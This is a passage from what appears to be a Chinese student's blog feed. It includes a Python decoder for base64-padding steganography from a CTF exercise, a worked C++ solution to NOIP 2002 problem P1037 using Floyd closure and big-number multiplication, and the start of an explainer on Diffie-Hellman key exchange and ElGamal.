class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-comment"># ccc.txt为待解密的base64隐写字符串所在的文件</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;base64.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>base64str = f.readline()<br><br><span class="hljs-comment"># pattern2用于匹配两个等号情况时，等号前的一个字符</span><br><span class="hljs-comment"># pattern2用于匹配一个等号情况时，等号前的一个字符</span><br>pattern2 = <span class="hljs-string">r&#x27;(\S)==$&#x27;</span><br>pattern1 = <span class="hljs-string">r&#x27;(\S)=$&#x27;</span><br><br><span class="hljs-comment"># 提取后的隐写二进制字符加入binstring中</span><br>binstring = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 逐行读取待解密的base64隐写字符串，逐行处理</span><br><span class="hljs-keyword">while</span>(base64str):<br>    <span class="hljs-comment"># 先匹配两个等号的情况，如果匹配不上，再配置一个等号的情况</span><br>    <span class="hljs-comment"># 如果无等号，则没有隐藏，无需处理</span><br>    <span class="hljs-keyword">if</span> re.<span class="hljs-built_in">compile</span>(pattern2).findall(base64str):<br>        <span class="hljs-comment"># mstr为等号前的一个字符，该字符为隐写二进制信息所在的字符</span><br>        mstr = re.<span class="hljs-built_in">compile</span>(pattern2).findall(base64str)[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># 确认mstr字符对应的base64二进制数，赋值给mbin</span><br>        mbin = <span class="hljs-built_in">bin</span>(b64chars.find(mstr))<br>        <span class="hljs-comment"># mbin格式如0b100，mbin[0:2]为0b</span><br>        <span class="hljs-comment"># mbin[2:].zfill(6)为将0b后面的二进制数前面补0，使0b后面的长度为6</span><br>        mbin2 = mbin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + mbin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>        <span class="hljs-comment"># 两个等号情况隐写了4位二进制数，所以提取mbin2的后4bit</span><br>        <span class="hljs-comment"># 赋值给stegobin，这就是隐藏的二进制信息</span><br>        stegobin = mbin2[-<span class="hljs-number">4</span>:]<br>        binstring += stegobin<br>    <span class="hljs-keyword">elif</span> re.<span class="hljs-built_in">compile</span>(pattern1).findall(base64str):<br>        mstr = re.<span class="hljs-built_in">compile</span>(pattern1).findall(base64str)[<span class="hljs-number">0</span>]<br>        mbin = <span class="hljs-built_in">bin</span>(b64chars.find(mstr))<br>        mbin2 = mbin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + mbin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>        <span class="hljs-comment"># 一个等号情况隐写了2位二进制数，所以提取mbin2的后2bit</span><br>        stegobin = mbin2[-<span class="hljs-number">2</span>:]<br>        binstring += stegobin<br>    base64str = f.readline()<br><br><span class="hljs-comment"># stegobin将各行隐藏的二进制字符拼接在一起</span><br><span class="hljs-comment"># 从第0位开始，8bit、8bit处理，所以range的步进为8</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(binstring),<span class="hljs-number">8</span>):<br>    <span class="hljs-comment"># int(xxx,2)，将二进制字符串转换为10进制的整数，再用chr()转为字符</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(binstring[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蓝桥杯刷题记录</title>
    <link href="/2023/05/20/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/05/20/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="洛谷">洛谷</h1><h2 id="P1037-NOIP2002-普及组-产生数">P1037 [NOIP2002 普及组] 产生数</h2><h3 id="题目描述">题目描述</h3><p>给出一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个变换规则。</p><p>规则：</p><ul><li>一位数可变换成另一个一位数。</li><li>规则的右部不能为零。</li></ul><p>例如：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>234</mn><mo separator="true">,</mo><mi>k</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">n=234,k=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">234</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>。有以下两个规则：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>⟶</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">2\longrightarrow 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6554em;vertical-align:-0.011em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟶</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>。</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>⟶</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">3\longrightarrow 6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6554em;vertical-align:-0.011em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟶</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span>。</li></ul><p>上面的整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>234</mn></mrow><annotation encoding="application/x-tex">234</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">234</span></span></span></span> 经过变换后可能产生出的整数为（包括原数）:</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>234</mn></mrow><annotation encoding="application/x-tex">234</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">234</span></span></span></span>。</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>534</mn></mrow><annotation encoding="application/x-tex">534</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">534</span></span></span></span>。</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>264</mn></mrow><annotation encoding="application/x-tex">264</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">264</span></span></span></span>。</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>564</mn></mrow><annotation encoding="application/x-tex">564</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">564</span></span></span></span>。</li></ul><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> 种不同的产生数。</p><p>现在给出一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个规则。求出经过任意次的变换（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 次或多次），能产生出多少个不同整数。</p><p>仅要求输出个数。</p><h3 id="输入格式">输入格式</h3><p>第一行两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">n,k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，含义如题面所示。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 行，每行两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i,y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，表示每条规则。</p><h3 id="输出格式">输出格式</h3><p>共一行，输出能生成的数字个数。</p><h3 id="样例-1">样例 #1</h3><h4 id="样例输入-1">样例输入 #1</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">234 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">5</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h4 id="样例输出-1">样例输出 #1</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4<br></code></pre></td></tr></table></figure><h3 id="提示">提示</h3><p>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">100%</span></span></span></span> 数据，满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>&lt;</mo><msup><mn>10</mn><mn>30</mn></msup></mrow><annotation encoding="application/x-tex">n \lt 10^{30}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>≤</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">k \le 15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">15</span></span></span></span>。</p><p><strong>【题目来源】</strong></p><p>NOIP 2002 普及组第三题</p><h3 id="题目解析">题目解析</h3><p>刚开始看的时候还以为时用dfs遍历所有可能，但是一看n的范围就知道这不可行。</p><p>之后看了大佬题解（大佬不愧是大佬，思路非常之清晰且简易），发现这道题就是一个图的遍历搜索和高精度乘法，学到了很精妙的分析问题的方法，特此记录一下。</p><p>这道题目本质上是一个排列组合，求出每个数字能转换成其他多少种数字，之后对在该大数内的每个数字的转换种类数相乘即可。这时候就会发现求</p><p>首先是Floyd算法，这里不多赘述，自行搜索学习即可，这里是用Floyd算法来判断两点之间是否有通路，来看这个题的输入和描述，其实就是一个有向图的输入，从一个数字能到达另一个数字就相当于两点之间有单向通路。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//把每一个数字都当成中间节点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">9</span>; k++)<br>&#123;<br>    <span class="hljs-comment">//遍历起始点</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">//尝试到达的点</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">9</span>; j++)<br>        &#123;<br>            <span class="hljs-comment">//如果能够到达就标记</span><br>            <span class="hljs-keyword">if</span>(dis[i][j] || (dis[i][k]&amp;&amp;dis[k][j]))<br>                dis[i][j]=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后由于数据过大，乘出来的数会爆longlong，高精度乘高精度又不会，但是仔细想一下发现可以写成高精度乘以低精度，之前在Acwing看的模板，直接贴上来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//高精度乘低精度</span><br><span class="hljs-comment">// C = A * b, A &gt;= 0, b &gt;= 0</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;A, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br><br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>() || t; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; A.<span class="hljs-built_in">size</span>()) t += A[i] * b;<br>        C.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; C.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<br><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后就是一些细节问题了</p><ul><li><p>Floyd自己到自己实际上是无效，改为0</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">9</span>;i++)<br>dis[i][i]=<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>高精度逆序输出</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br>string n;<br><span class="hljs-type">int</span> dis[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>]=&#123;<span class="hljs-number">0</span>&#125;, t[<span class="hljs-number">11</span>];<br>vector&lt;<span class="hljs-type">int</span>&gt; A;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">floyd</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">9</span>; k++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">9</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span>(dis[i][j] || (dis[i][k]&amp;&amp;dis[k][j]))<br>dis[i][j]=<span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; A, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>vector&lt;<span class="hljs-type">int</span>&gt; C;<br><span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>() || t; i++)<br>&#123;<br><span class="hljs-keyword">if</span>(i &lt; A.<span class="hljs-built_in">size</span>()) t+=A[i]*b;<br>C.<span class="hljs-built_in">push_back</span>(t%<span class="hljs-number">10</span>);<br>t/=<span class="hljs-number">10</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(C.<span class="hljs-built_in">back</span>()==<span class="hljs-number">0</span>&amp;&amp;C.<span class="hljs-built_in">size</span>()&gt;<span class="hljs-number">1</span>) C.<span class="hljs-built_in">pop_back</span>();<br><span class="hljs-keyword">return</span> C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> k;<br>cin &gt;&gt; n &gt;&gt; k;<br><span class="hljs-type">int</span> len = n.<span class="hljs-built_in">length</span>();<br><span class="hljs-type">int</span> a,b;<br><span class="hljs-type">int</span> i,j;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; k; i++)<br>&#123;<br>cin &gt;&gt; a &gt;&gt; b;<br>dis[a][b]=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">floyd</span>();<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">9</span>;i++)<br>dis[i][i]=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> time;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i++)<br>&#123;<br>time = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">9</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span>(dis[i][j])<br>time++;<br>&#125;<br>t[i]=time;<br>&#125;<br><br>A.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br><span class="hljs-keyword">if</span>(t[n[i]-<span class="hljs-string">&#x27;0&#x27;</span>])<br>A=<span class="hljs-built_in">mul</span>(A,t[n[i]-<span class="hljs-string">&#x27;0&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">for</span>(i = A.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br>cout &lt;&lt; A[i];<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D-H密钥协商协议与EIGamal算法</title>
    <link href="/2023/05/19/D-H%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE%E4%B8%8EEIGamal%E7%AE%97%E6%B3%95/"/>
    <url>/2023/05/19/D-H%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E5%8D%8F%E8%AE%AE%E4%B8%8EEIGamal%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="D-H密钥协商协议">D-H密钥协商协议</h1><p>在基于对称加密进行安全通信的过程中，通信双方需要持有一个共享的密钥。只有这样，由任何一方加密的信息才能由另一方使用相同的密钥解密。但是<strong>在能够安全的通信之前，通信双方应该如何约定一个共享的密钥呢？这就是安全中的经典问题：密钥配送问题</strong></p><p><strong>解决密钥配送问题通常有三种方式：线下约定共享密钥、通过公钥密码体系配送共享密钥、以及Diffie-Hellman密钥交换协议</strong></p><p>D-H密钥协商协议是基于离散对数困难问题的密钥交换协议，首先</p><ul><li>由协议双方A和B先协商好大素数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>以及<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>的原根<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span>，并且公开这两个值</li><li>A取一个私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>，发送给B计算结果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><msup><mi>G</mi><mi>a</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi 